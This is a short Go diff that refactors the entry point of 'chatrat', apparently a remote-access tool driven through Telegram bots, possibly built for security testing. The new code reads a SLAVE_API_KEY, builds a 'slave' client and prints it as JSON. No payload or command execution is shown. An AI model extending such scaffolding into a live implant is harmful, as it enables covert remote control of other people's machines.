@@ -1,19 +1,26 @@
 package main
 
 import (
-	"github.com/CoveoSec/chatrat/pkg/core"
-	"github.com/joho/godotenv"
-	"github.com/lithammer/shortuuid/v4"
+	"encoding/json"
+	"fmt"
 	"os"
+
+	"github.com/CoveoSec/chatrat/pkg/listeners"
+	"github.com/CoveoSec/chatrat/pkg/slave"
+	"github.com/joho/godotenv"
 )
 
 func main() {
 	godotenv.Load()
 
-	id := shortuuid.New()
-	botType := "telegram"
+	key := os.Getenv("SLAVE_API_KEY")
 
-	slave := core.NewSlave(os.Getenv("SLAVE_API_KEY"), botType, id)
-	slave.SendMessage()
+	commType := listeners.TELEGRAM
+
+	slave := slave.NewSlave(key, commType)
+
+	jsonSlave, _ := json.MarshalIndent(slave, "", "  ")
+
+	fmt.Printf("%+v", string(jsonSlave))
 
 }
